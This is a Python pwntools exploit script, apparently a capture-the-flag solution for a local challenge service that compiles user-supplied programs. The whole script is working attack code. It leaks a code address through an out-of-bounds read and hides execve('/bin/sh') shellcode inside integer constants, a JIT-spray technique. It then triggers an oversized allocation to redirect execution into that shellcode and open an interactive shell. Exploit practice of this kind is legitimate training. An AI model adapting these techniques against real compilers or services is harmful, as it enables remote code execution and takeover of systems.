#!/usr/bin/env python3
from pwn import args, process, remote, context, u64, asm
import base64
import inspect


def start():
    if not args.REMOTE:
        return process(['/usr/bin/python3', 'chall.py'])
    return remote('localhost', 10003)


def compile_program(io, program_src: str):
    io.sendlineafter(b'menu>\n', b'1')
    io.sendlineafter(b'program>\n', base64.b64encode(program_src.encode()))


def exec_program(io, idx: int, arg: int, shouldgetresult=True):
    io.sendlineafter(b'menu>\n', b'2')
    io.sendlineafter(b'idx>\n', str(idx).encode())
    io.sendlineafter(b'arg>\n', str(arg).encode())
    if shouldgetresult:
        io.recvuntil(b'output: ')
        result = int(io.recvline().strip(), 0x10)
        print(f'{arg} {result=:#x}')
        return result


class LeakProgram:
    bss0 = 0
    data0 = 0x4141414141414141
    data1 = 0x4141414141414142

    def shellcode():
        a0 = 0x7eb580068732f68
        a1 = 0x7eb5a6e69622f68
        a2 = 0x7ebf63120e0c148
        a3 = 0x7eb50d231d00148
        a4 = 0x50f583b6ae78948
        return a0 + a1 + a2 + a3 + a4

    def bar():
        return 1

    def foo():
        x = bar()
        return x

    def leak(idx):
        v0 = Alloc(16)
        return v0[idx]

    def main(a0):
        foo()
        l = leak(a0)
        return l


class PwnProgram:
    def pwn(retAddr):
        v0 = Alloc(0x1fffffffffffffff)
        return v0[1]

    def main(retAddr):
        x = pwn(retAddr)
        return x


context(arch='amd64')
jmp = b'\xeb\x07'
shell = u64(b'/bin/sh\x00')


def gen_shellcode():
    def make_double(code):
        assert len(code) <= 6
        print(hex(u64(code.ljust(6, b'\x90') + jmp)))

    make_double(asm("push %d; pop rax" % (shell >> 0x20)))
    make_double(asm("push %d; pop rdx" % (shell % 0x100000000)))
    make_double(asm("shl rax, 0x20; xor esi, esi"))
    make_double(asm("add rax, rdx; xor edx, edx; push rax"))
    code = asm("mov rdi, rsp; push 59; pop rax; syscall")
    assert len(code) <= 8
    print(hex(u64(code.ljust(8, b'\x90')))[2:])


def main():
    io = start()
    compile_program(io, inspect.getsource(LeakProgram))
    compile_program(io, inspect.getsource(PwnProgram))
    io.sendlineafter(b'menu>\n', b'3')
    io.recvuntil(b'output: ')
    main_ptr = int(io.recvline().strip(), 0x10)
    # for leakIdx in range(80):
    LeakProgramRXBase = exec_program(io, 0, 12) & 0xfffffffffffff000
    shellcode = LeakProgramRXBase+2
    print(f'LeakProgramRXBase = {LeakProgramRXBase:#x}')
    exec_program(io, 1, shellcode, False)

    io.interactive()


if __name__ == '__main__':
    main()
